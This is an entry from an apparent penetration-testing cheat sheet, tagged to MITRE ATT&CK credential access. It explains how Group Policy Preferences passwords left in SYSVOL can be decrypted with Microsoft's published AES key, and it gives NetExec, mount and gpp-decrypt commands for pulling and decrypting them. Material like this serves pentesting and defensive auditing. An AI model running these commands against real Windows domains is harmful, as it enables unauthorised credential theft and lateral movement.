---
id: gpp-cpassword
title: GPP cpassword (decrypt the SYSVOL AES key)
section: Netbios-ssn / Microsoft-ds — TCP 139/445 (SMB)
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1552.006]
platform: [windows, network]
source: hacktheplanet §"Netbios-ssn / Microsoft-ds — TCP 139/445 (SMB)"
pair: gpp-cpassword-5145
---

Group Policy Preferences stored passwords in SYSVOL XML encrypted with an AES key
Microsoft *published* — so any authenticated domain user can read and decrypt
them. The XML (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`) is readable
over SMB on every DC. MS14-025 stopped *new* ones, but old `cpassword` values
linger in SYSVOL for years.

```sh
nxc smb {{rhost}} -u {{user}} -p {{password}} -M gpp_password
sudo mount -t cifs //{{rhost}}/SYSVOL /mnt -o username={{user}},password={{password}}
gpp-decrypt <cpassword-blob>
```
